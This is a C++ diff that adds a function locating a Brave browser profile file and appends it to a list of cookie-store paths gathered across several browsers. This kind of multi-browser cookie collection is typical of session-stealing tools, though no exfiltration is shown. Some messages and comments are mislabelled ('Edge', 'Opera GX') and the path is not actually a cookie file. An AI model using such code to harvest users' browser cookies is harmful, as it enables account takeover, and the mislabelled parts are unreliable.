@@ -239,6 +239,30 @@ std::wstring GetOperaGXStableCookiesPath() {
     return L"";
 }
 
+std::wstring GetBraveCookiesPath() {
+    // Get the user's name
+    wchar_t userName[MAX_PATH];
+    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
+    if (!GetUserNameW(userName, &userNameSize)) {
+        std::cerr << "Failed to retrieve user name." << std::endl;
+        return L"";
+    }
+
+    // Construct the Brave Cookies file path
+    //I will fix that link in future.
+    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Service Worker\\Database\\CURRENT";
+
+    if (DoesFileExist(desiredPath)) {
+        std::wcout << "Edge cookies file found at: " << desiredPath << std::endl;
+        return desiredPath;
+    }
+    else {
+        std::wcerr << "Failed to find Edge cookies file at: " << desiredPath << std::endl;
+        std::cerr << "Error code: " << GetLastError() << std::endl;
+    }
+    return L"";
+}
+
 // Function to get paths of cookies from different browsers
 std::vector<std::wstring> GetCookiePaths() {
     std::vector<std::wstring> cookiePaths;
@@ -286,6 +310,15 @@ std::vector<std::wstring> GetCookiePaths() {
     }
     else {
         std::wcerr << "Failed to retrieve Opera GX Stable cookies path." << std::endl;
+    }
+
+    // Get the path of Opera GX Stable cookies and add it to the vector if it exists
+    std::wstring BraveCookiesPath = GetBraveCookiesPath();
+    if (!BraveCookiesPath.empty()) {
+        cookiePaths.push_back(BraveCookiesPath);
+    }
+    else {
+        std::wcerr << "Failed to retrieve Brave cookies path." << std::endl;
     }
 
     return cookiePaths;
